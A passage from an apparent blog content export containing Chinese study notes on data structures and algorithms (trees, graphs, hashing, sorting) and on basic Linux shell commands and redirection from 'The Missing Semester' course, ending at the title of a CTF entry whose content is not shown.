src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231228095808924.png" alt="image-20231228095808924"></p><h5 id="中序线索二叉树"><a href="#中序线索二叉树" class="headerlink" title="中序线索二叉树"></a>中序线索二叉树</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231228100248464.png" alt="image-20231228100248464"></p><h5 id="后序线索二叉树"><a href="#后序线索二叉树" class="headerlink" title="后序线索二叉树"></a>后序线索二叉树</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231228100404375.png" alt="image-20231228100404375"></p><h4 id="树的存储结构"><a href="#树的存储结构" class="headerlink" title="树的存储结构"></a>树的存储结构</h4><h5 id="双亲表示法"><a href="#双亲表示法" class="headerlink" title="双亲表示法"></a>双亲表示法</h5><p>根结点无父亲 故为-1<br>F的父节点是C C的下标是3</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231228104447870.png" alt="image-20231228104447870"></p><h5 id="孩子表示法"><a href="#孩子表示法" class="headerlink" title="孩子表示法"></a>孩子表示法</h5><p>链式进行存储 查找速度很快</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231228110149679.png" alt="image-20231228110149679"></p><h5 id="孩子兄弟表示法"><a href="#孩子兄弟表示法" class="headerlink" title="孩子兄弟表示法"></a>孩子兄弟表示法</h5><p>兄弟兄弟往下存<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231228110943965.png" alt="image-20231228110943965"></p><h4 id="森林、树和二叉树之间的转换"><a href="#森林、树和二叉树之间的转换" class="headerlink" title="森林、树和二叉树之间的转换"></a>森林、树和二叉树之间的转换</h4><h5 id="树转换为二叉树"><a href="#树转换为二叉树" class="headerlink" title="树转换为二叉树"></a>树转换为二叉树</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104104015443.png" alt="image-20240104104015443"></p><h5 id="二叉树转换为树"><a href="#二叉树转换为树" class="headerlink" title="二叉树转换为树"></a>二叉树转换为树</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104104150920.png" alt="image-20240104104150920"></p><h5 id="森林转换为二叉树"><a href="#森林转换为二叉树" class="headerlink" title="森林转换为二叉树"></a>森林转换为二叉树<img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240104104351221.png" alt="image-20240104104351221"></h5><h5 id="二叉树转换为森林"><a href="#二叉树转换为森林" class="headerlink" title="二叉树转换为森林"></a>二叉树转换为森林</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104105859199.png" alt="image-20240104105859199"></p><h4 id="哈夫曼树的构造"><a href="#哈夫曼树的构造" class="headerlink" title="哈夫曼树的构造"></a>哈夫曼树的构造</h4><p>Q：构造19, 21,2,3,6，7, 10，32的哈夫曼树,并计算WPL〔带权路径长度）的值。</p><p>Step:<br>1.选择两个最小结点<br>2.用计算结点替代原两结点<br>3.比较运算结果 循环上述步骤</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104110509254.png" alt="image-20240104110509254"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WPL计算：结点值*层数</span><br></pre></td></tr></table></figure><h4 id="图的定义和术语"><a href="#图的定义和术语" class="headerlink" title="图的定义和术语"></a>图的定义和术语</h4><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104110926157.png" alt="image-20240104110926157"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104110956343.png" alt="image-20240104110956343"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104111004803.png" alt="image-20240104111004803"></p><h4 id="邻接矩阵（图的一种存储结构）"><a href="#邻接矩阵（图的一种存储结构）" class="headerlink" title="邻接矩阵（图的一种存储结构）"></a>邻接矩阵（图的一种存储结构）</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">连通写1 不连通写0</span><br></pre></td></tr></table></figure><h5 id="无向图的邻接矩阵"><a href="#无向图的邻接矩阵" class="headerlink" title="无向图的邻接矩阵"></a>无向图的邻接矩阵</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104111642007.png" alt="image-20240104111642007"><strong>特点</strong>：前半部分和后半部分对称</p><h5 id="有向图的邻接矩阵"><a href="#有向图的邻接矩阵" class="headerlink" title="有向图的邻接矩阵"></a>有向图的邻接矩阵</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104111933916.png" alt="image-20240104111933916"></p><p><strong>特点</strong>：不对称 出度按行求和 入度按列求和 </p><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">总度数</span>=<span class="string">出度+入度</span></span><br></pre></td></tr></table></figure><h5 id="有权图的邻接矩阵"><a href="#有权图的邻接矩阵" class="headerlink" title="有权图的邻接矩阵"></a>有权图的邻接矩阵</h5><p>**两个结点无连接填无穷大 **</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104112102780.png" alt="image-20240104112102780"></p><h4 id="邻接表法"><a href="#邻接表法" class="headerlink" title="邻接表法"></a>邻接表法</h4><h5 id="邻接矩阵存在的缺点："><a href="#邻接矩阵存在的缺点：" class="headerlink" title="邻接矩阵存在的缺点："></a>邻接矩阵存在的缺点：</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104112151351.png" alt="image-20240104112151351"></p><h5 id="无向图的邻接表"><a href="#无向图的邻接表" class="headerlink" title="无向图的邻接表"></a>无向图的邻接表</h5><p><strong>画出顶点域和边表头指针域</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104112425169.png" alt="image-20240104112425169"><strong>表头指针域无指向的时候用反斜杠</strong></p><h5 id="有向图的邻接表"><a href="#有向图的邻接表" class="headerlink" title="有向图的邻接表"></a>有向图的邻接表</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104112519850.png" alt="image-20240104112519850"></p><h4 id="十字链表画法"><a href="#十字链表画法" class="headerlink" title="十字链表画法"></a>十字链表画法</h4><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104112901484.png" alt="image-20240104112901484"></p><h5 id="1-写出结点域"><a href="#1-写出结点域" class="headerlink" title="1.写出结点域"></a>1.写出结点域</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104112738435.png" alt="image-20240104112738435"></p><h5 id="2-开画"><a href="#2-开画" class="headerlink" title="2.开画"></a>2.开画</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104112914603.png" alt="image-20240104112914603"></p><h5 id="3-找出结点域序号对应的空格进行连接指向-结束符"><a href="#3-找出结点域序号对应的空格进行连接指向-结束符" class="headerlink" title="3.找出结点域序号对应的空格进行连接指向+结束符"></a>3.找出结点域序号对应的空格进行连接指向+结束符</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104113056715.png" alt="image-20240104113056715"></p><h5 id="4-按照弧度顺序画图"><a href="#4-按照弧度顺序画图" class="headerlink" title="4.按照弧度顺序画图"></a>4.按照弧度顺序画图</h5><p>0，1，2，3</p><h4 id="图的广度优先遍历"><a href="#图的广度优先遍历" class="headerlink" title="图的广度优先遍历"></a>图的广度优先遍历</h4><p><strong>层层求解</strong><br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104182328110.png" alt="image-20240104182328110"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240104182317826.png" alt="image-20240104182317826"></p><h4 id="图的深度优先遍历"><a href="#图的深度优先遍历" class="headerlink" title="图的深度优先遍历"></a>图的深度优先遍历</h4><h5 id="悬崖勒马"><a href="#悬崖勒马" class="headerlink" title="悬崖勒马"></a>悬崖勒马</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108154907188.png" alt="image-20240108154907188"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108154928796.png" alt="image-20240108154928796"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108154949965.png" alt="image-20240108154949965"></p><h4 id="Prim算法（求解最小生成树"><a href="#Prim算法（求解最小生成树" class="headerlink" title="Prim算法（求解最小生成树)"></a>Prim算法（求解最小生成树)</h4><p>1.从结点出发，优先选择权值较小的边<br>2.再选择与所选顶点中权值最小的边<br>3.直到连接所有顶点<br><strong>注意</strong>：连接过程中不能出现环<br>如图：<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108162751161.png" alt="image-20240108162751161"></p><h4 id="Kruskal算法（最小生成树）"><a href="#Kruskal算法（最小生成树）" class="headerlink" title="Kruskal算法（最小生成树）"></a>Kruskal算法（最小生成树）</h4><p>1.找出最小边<br>2.判断是否有环<br>3.直到连接所有顶点</p><h4 id="最短路径-Dijkstra算法"><a href="#最短路径-Dijkstra算法" class="headerlink" title="最短路径-Dijkstra算法"></a>最短路径-Dijkstra算法</h4><p>T：可以确定到达<br>F：无法确定到达<br>dis:距离<br>无法直接到达填无穷大<br>换点求值的dis若小于原dis需更新将其更新为dis</p><p>从1点出发到达每个结点的最短路径<img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108164053120.png" alt="image-20240108164053120"></p><h4 id="最短路径-Floyd算法"><a href="#最短路径-Floyd算法" class="headerlink" title="最短路径-Floyd算法"></a>最短路径-Floyd算法</h4><p>行：起始点<br>列</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108165520716.png" alt="image-20240108165520716"></p><p>去掉出发点结束点以及斜对角（即所求点所在的行和列行列）<img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108170055738.png" alt="image-20240108170055738"></p><h4 id="拓扑排序和逆拓扑排序"><a href="#拓扑排序和逆拓扑排序" class="headerlink" title="拓扑排序和逆拓扑排序"></a>拓扑排序和逆拓扑排序</h4><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108171446237.png" alt="image-20240108171446237"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108172207326.png" alt="image-20240108172207326"></p><h4 id="AOE网中的关键路径"><a href="#AOE网中的关键路径" class="headerlink" title="AOE网中的关键路径"></a>AOE网中的关键路径</h4><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108172733812.png" alt="image-20240108172733812"></p><p>最迟发生时间从v6开始计算 事件发生的最早时间-对应权值<br>关键路径：最早时间和最迟时间相等的点<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108172908486.png" alt="image-20240108172908486"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108173114691.png" alt="image-20240108173114691"></p><h4 id="平均查找长度-折半查找"><a href="#平均查找长度-折半查找" class="headerlink" title="平均查找长度-折半查找"></a>平均查找长度-折半查找</h4><p>Step：1.选值画树<br>           2.算数</p><p>先找根节点（向下取整） 再依次找出左右孩子（均值且向下取整）</p><p>查找成功的补上所缺的孩子 叶子节点补上左右孩子</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108205655509.png" alt="image-20240108205655509"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">每一层的层数*对应节点数</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108205835058.png" alt="image-20240108205835058"></p><p><strong>注意：</strong>查找失败的叶子节点计算层数往上抬一层（即减少一层）</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108210009654.png" alt="image-20240108210009654"></p><h4 id="平均查找长度-分块查找"><a href="#平均查找长度-分块查找" class="headerlink" title="平均查找长度-分块查找"></a>平均查找长度-分块查找</h4><p>分块：块内无序，块间有序</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108210133747.png" alt="image-20240108210133747"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108211235371.png" alt="image-20240108211235371"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240108211515589.png" alt="image-20240108211515589"></p><h4 id="平衡二叉树"><a href="#平衡二叉树" class="headerlink" title="平衡二叉树"></a>平衡二叉树</h4><p>1.平衡二叉树左子树和右子树高度之差不超过1<br>2.以不平衡二叉树的根节点开始，沿着加入的结点方向与之相邻的三个结点进行调整</p><p><strong>大于-&gt;右孩子 小于-&gt;左孩子</strong><br>48为根节点 左孩子的度数为0 右孩子的度数为2 需调整<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108211940132.png" alt="image-20240108211940132"></p><p>找到与根节点（包含根节点）相邻的三个结点找到中间值 进行左右孩子调整后移到原来位置【特别注意单长分支】<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108212015309.png" alt="image-20240108212015309"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108212157146.png" alt="image-20240108212157146"></p><p>记得左边孩子也要调整<img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108212247659.png" alt="image-20240108212247659"></p><h4 id="红黑树"><a href="#红黑树" class="headerlink" title="红黑树"></a>红黑树</h4><p><strong>定义</strong><br>特殊的二叉排序树，主要用它存储有序的结构，查找操作时间复杂度O（log2n）</p><p><strong>特性</strong><br>1.每个结点红色&#x2F;黑色<br>2.根节点是黑色的<br>3.叶节点（外部结点、NULL结点、失败结点）均是黑色的<br>4.不存在两个相邻的红结点（即红结点的父节点和孩子都是黑色的）每两个红色结点之间必有一个黑色结点进行间隔<br>5.对于每个结点，从该节点到任一叶结点的简单路径上，所含黑结点的数目相同</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">左根右（左孩子小于右孩子）</span><br><span class="line">根叶黑（根结点和叶结点都是黑色的）</span><br><span class="line">不红红（两个相邻的红结点之间必有一个黑结点）</span><br><span class="line">黑路通（任意结点到达叶子结点经历的黑色结点数相同）</span><br></pre></td></tr></table></figure><h4 id="B数"><a href="#B数" class="headerlink" title="B数"></a>B数</h4><p><strong>定义</strong><br>多路平衡查找树<br>B树的阶：B树中所有结点的孩子个数的最大值（m）<br>空树：m阶B树</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108213540726.png" alt="image-20240108213540726"></p><p>叶子结点实际是空指针（指向NULL）查找失败之后指向空值<br>终端结点指向实际值<br><strong>特性</strong><br>1.树的根结点至多有m颗子树，即至多含有m-1个关键字<br>2.若根节点不是终端节点，则至少有两颗子树<br>3.除根节点外的所有非叶节点</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108215954396.png" alt="image-20240108215954396"></p><p>从左到右以此增大</p><h4 id="散列表处理冲突的方法"><a href="#散列表处理冲突的方法" class="headerlink" title="散列表处理冲突的方法"></a>散列表处理冲突的方法</h4><h5 id="线性探测法"><a href="#线性探测法" class="headerlink" title="线性探测法"></a>线性探测法</h5><p>用散列函数进行求解 有冲突往下求解</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240108220959786.png" alt="image-20240108220959786"></p><h5 id="平方探测法"><a href="#平方探测法" class="headerlink" title="平方探测法"></a>平方探测法</h5><p>首先用散列函数进行查找 有冲突用di从0的平方开始<br>顺延可以往前也可以往后<br><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240108231526514.png" alt="image-20240108231526514"></p><h5 id="双散列法"><a href="#双散列法" class="headerlink" title="双散列法"></a>双散列法</h5><p>有冲突对两个散列表长度进行相加求解取mod</p><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240108231726833.png" alt="image-20240108231726833"></p><p>i &#x3D; 冲突的次数（递增）</p><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240108232107297.png" alt="image-20240108232107297"></p><p>4的位置已被占 此时用Hi公式 0+1*4 &#x3D; 4又回到4的位置被占用 递增i<br>i &#x3D; 2 Hi &#x3D; 0 + 4 * 2 &#x3D; 8</p><h4 id="直接插入排序算法"><a href="#直接插入排序算法" class="headerlink" title="直接插入排序算法"></a>直接插入排序算法</h4><p><strong>Step</strong><br>1.选取一个数并将其作为有序序列<br>2.每一轮排序将后面的一个数加入改序列<br>3.直到最后一个数</p><h4 id="折半插入排序"><a href="#折半插入排序" class="headerlink" title="折半插入排序"></a>折半插入排序</h4><p><strong>Step</strong><br>1.选取一个数并将其作为有序序列<br>2.每一轮用折半查找法将后面的一个数加入到该序列<br>3.直到最后一个数</p><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240108233354754.png" alt="image-20240108233354754"></p><p>初始位空余用来排序 默认第一位是有序序列 从第二位开始 将第二位移到0位</p><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240108233419168.png" alt="image-20240108233419168"></p><p>选取数小于mid high指针前移（mid向上取整）<br>选取数大于mid low指针后移<br>low &#x3D;&#x3D;high 时结束排序</p><h4 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h4><p>1.间隔分组（通常为总长度的一半）<br>2.组内排序<br>3.重新设置间隔分组（为前一次分组的一半）<br>4.重新插入排序</p><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240109001556346.png" alt="image-20240109001556346"></p><p>组内排序</p><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240109001659213.png" alt="image-20240109001659213"></p><p>同样组内排序直至分为一组</p><h4 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h4><p><strong>step</strong><br>1.依次比较两个相邻元素<br>2.若无序就交换位置，将较大值放在后面</p><h4 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h4><p><strong>Step</strong><br>1.选定一个数为中心轴（通常为首位）<br>2.将小于该数字的元素放在左边<br>3.将大于该数字的元素放在右边<br>4分别为左右子序列重复前三步操作</p><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240109002822376.png" alt="image-20240109002822376"></p><p>选中轴移到最开始位置（0）<br>从右边开始排序（high）找到比中心轴的值小开始从左比较<br>low和high重合排序结束</p><h4 id="简单选择排序"><a href="#简单选择排序" class="headerlink" title="简单选择排序"></a>简单选择排序</h4><p>Step<br>1.从头到尾扫描序列，找到最小元素与第一位进行交换<br>2.从剩下的无序队列中选出最小元素与第一位进行交换，以此类推<br><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240109003743729.png" alt="image-20240109003743729"></p><p>整个数组有8位经过8次交换</p><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240109003813759.png" alt="image-20240109003813759"></p><h4 id="堆排序（选择排序）"><a href="#堆排序（选择排序）" class="headerlink" title="堆排序（选择排序）"></a>堆排序（选择排序）</h4><p><strong>Step</strong><br>1.生成完全二叉树<br>2.从第一个非叶子结点：n&#x2F;2-1 开始调整（n：序列长度 ）<br>一共4层长度为8 8&#x2F;2-1 &#x3D; 3 97开始 </p><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20240109004918159.png" alt="image-20240109004918159"></p><p>大根堆：父节点大于子结点<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109105338676.png" alt="image-20240109105338676"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109105414965.png" alt="image-20240109105414965"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109105435445.png" alt="image-20240109105435445"></p><p>插入元素后进行调整只需对根节点到新增节点进行调整</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109110347845.png" alt="image-20240109110347845"><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109110420903.png" alt="image-20240109110420903">删除元素后只需将尾节点移动到首节结点的位置<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109110307330.png" alt="image-20240109110307330"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109110331687.png" alt="image-20240109110331687"></p><h4 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h4><p><strong>Step</strong><br>1.开始每个数字作为一组<br>2.每次进行前后两个数的两两比较 直到最后一组<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109110533528.png" alt="image-20240109110533528"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109110611575.png" alt="image-20240109110611575"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109110624186.png" alt="image-20240109110624186"></p><h4 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h4><p><strong>step</strong><br>1.将数字按位分割成多个部分<br>2.根据每个部分信息将数字进行分配<br>3.将数字依次收集 组成新的排序结果</p><p>个位<img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109110744955.png" alt="image-20240109110744955"></p><p>十位<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109110837347.png" alt="image-20240109110837347"></p><p>百位<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109110858727.png" alt="image-20240109110858727"></p><h4 id="排序算法总结"><a href="#排序算法总结" class="headerlink" title="排序算法总结"></a>排序算法总结</h4><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240109111241802.png" alt="image-20240109111241802"></p><p>有两只动物，一只叫插帽龟，另一只叫统计鸡，它两做事情都很稳，其中插帽龟喜欢插帽子，统计鸡喜欢做统计（加减乘除）。<br>但有一天，插帽龟在选择帽子时候，掉了帽子就慌（方 n^2）了，还好被恩人（nlog）捡到快速归还给对方(堆).</p>]]></content>
      
      
      <categories>
          
          <category> 碎片 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 知识碎片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>The Missing Semester of Your CS Education</title>
      <link href="/2023/12/24/The%20Missing%20Semester%20of%20Your%20CS%20Education/"/>
      <url>/2023/12/24/The%20Missing%20Semester%20of%20Your%20CS%20Education/</url>
      
        <content type="html"><![CDATA[<h2 id="The-Missing-Semester-of-Your-CS-Education"><a href="#The-Missing-Semester-of-Your-CS-Education" class="headerlink" title="The Missing Semester of Your CS Education"></a>The Missing Semester of Your CS Education</h2><h3 id="First-Course-Overview-The-Shell"><a href="#First-Course-Overview-The-Shell" class="headerlink" title="First   Course Overview The Shell"></a>First   Course Overview The Shell</h3><h2 id="命令行语句"><a href="#命令行语句" class="headerlink" title="命令行语句"></a>命令行语句</h2><table><thead><tr><th align="left"></th><th></th></tr></thead><tbody><tr><td align="left">pwd(process[print] working directory)</td><td>输出当前位置</td></tr><tr><td align="left">cd .</td><td>到当前目录</td></tr><tr><td align="left">cd ..</td><td>上一级目录</td></tr><tr><td align="left">cd &#x2F;cd ~</td><td>回到根目录</td></tr><tr><td align="left">cd -</td><td>回到跳转前的目录（可在两个目录之间切换）</td></tr><tr><td align="left">ls -l</td><td>列出当前目录下子文件的详细信息</td></tr><tr><td align="left">ls -a</td><td>列出所有文件包含隐藏文件</td></tr><tr><td align="left">* ?</td><td>代替一个字符串 一个字符</td></tr><tr><td align="left">mv A B</td><td>重命名并可以移动文件</td></tr><tr><td align="left">cp A B</td><td>复制并可以移动文件</td></tr><tr><td align="left">control L</td><td>清除终端</td></tr><tr><td align="left">cat</td><td>打印文件内容到终端上</td></tr><tr><td align="left">touch</td><td>建立新文件</td></tr><tr><td align="left">&gt;&gt;</td><td>不覆盖而是叠加</td></tr><tr><td align="left">A | B</td><td>A的输出作为B的输入</td></tr><tr><td align="left">grep A B</td><td>在A里查找B</td></tr><tr><td align="left">man,rm,mkdir,rmdir</td><td></td></tr><tr><td align="left">&gt; &#x2F;</td><td>覆盖</td></tr></tbody></table><p>rm用于无递归删除 -r 递归删除  rmdir仅允许删除空目录</p><p>mkdir 创建目录</p><h3 id="关于重定向和-cat"><a href="#关于重定向和-cat" class="headerlink" title="关于重定向和 cat"></a><strong>关于重定向和 cat</strong></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> hello &gt; hello.txt</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> hello.txt</span></span><br><span class="line">hello</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> &lt; hello.txt</span></span><br><span class="line">hello</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> &lt; hello.txt &gt; hello2.txt<span class="comment">#将txt内容复制到2.txt中</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> hello2.txt</span></span><br><span class="line">hello</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> &lt;hello.txt &gt;&gt; hello2.txt</span></span><br><span class="line">hello</span><br><span class="line">hello</span><br></pre></td></tr></table></figure><p>本以为 <code>cat &lt; hello.txt</code> 会报错 <code>cat: hello: No such file or directory</code>。猜想正确工作的原因是“参数”和“输入”的区别（未经验证或查找资料）：cat 程序将输入打印在屏幕上，<code>cat hello.txt</code> 中的 <code>hello.txt</code> 是参数，将该文件的内容作为输入；而 <code>cat &lt; hello.txt</code> 是输入重定向，意思也是将文件中的内容作为程序的输入，而不是将文件的内容作为参数，因此二者效果相同。</p><h3 id="tee-的小用处"><a href="#tee-的小用处" class="headerlink" title="tee 的小用处"></a><strong>tee 的小用处</strong></h3><p>接受输入并将其写入文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">echo</span> 500 &gt; brightness(sudo su后) == ehco 500 | sudo <span class="built_in">tee</span> brightness</span> </span><br></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ cd /sys/<span class="keyword">class</span>/<span class="symbol">backlight</span>/<span class="symbol">thinkpad_screen</span></span><br><span class="line">$ <span class="symbol">sudo</span> <span class="symbol">echo</span> <span class="symbol">3</span> &gt; <span class="symbol">brightness</span></span><br><span class="line"><span class="symbol">An</span> <span class="symbol">error</span> <span class="symbol">occurred</span> <span class="symbol">while</span> <span class="symbol">redirecting</span> <span class="symbol">file</span> &#x27;<span class="symbol">brightness</span>&#x27;</span><br><span class="line"><span class="symbol">open: <span class="symbol">Permission</span></span> <span class="symbol">denied</span></span><br></pre></td></tr></table></figure><p>出乎意料的是，我们还是得到了一个错误信息。毕竟，我们已经使用了 <code>sudo</code> 命令！关于 shell，有件事我们必须要知道。<code>|</code>、<code>&gt;</code>、和 <code>&lt;</code> 是通过 shell 执行的，而不是被各个程序单独执行。 <code>echo</code> 等程序并不知道 <code>|</code> 的存在，它们只知道从自己的输入输出流中进行读写。 对于上面这种情况， <em>shell</em> (权限为您的当前用户) 在设置 <code>sudo echo</code> 前尝试打开 brightness 文件并写入，但是系统拒绝了 shell 的操作因为此时 shell 不是根用户。</p><p>明白这一点后，我们可以这样操作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> 3 | sudo <span class="built_in">tee</span> brightness</span> </span><br></pre></td></tr></table></figure><p>因为打开 <code>/sys</code> 文件的是 <code>tee</code> 这个程序，并且该程序以 <code>root</code> 权限在运行，因此操作可以进行。</p><p>当有权限修改文件但无法修改文件所在目录时，即无法删除文件，只可将其制空</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ xdg-<span class="keyword">open</span> binary <span class="type">name</span>#适用Linux just <span class="keyword">open</span> <span class="keyword">on</span> the Mac <span class="keyword">system</span> Windows didn<span class="string">&#x27;t work</span></span><br></pre></td></tr></table></figure><h3 id="Shell-Tools-and-Scripting"><a href="#Shell-Tools-and-Scripting" class="headerlink" title="Shell Tools and Scripting"></a>Shell Tools and Scripting</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/m/tools &gt; &gt; &gt;<span class="built_in">echo</span> <span class="string">&quot;value is <span class="variable">$foo</span>&quot;</span></span><br><span class="line">value is bash</span><br></pre></td></tr></table></figure><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~<span class="regexp">/m/</span>tools &gt; &gt; &gt;echo <span class="string">&#x27;value is $foo&#x27;</span></span><br><span class="line">vlaue is <span class="symbol">$foo</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 碎片 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nep摸鱼记</title>
      <link href="/2023/11/27/NepCTF%202023/"/>
      <url>/2023/11/27/NepCTF%202023/</url>
      
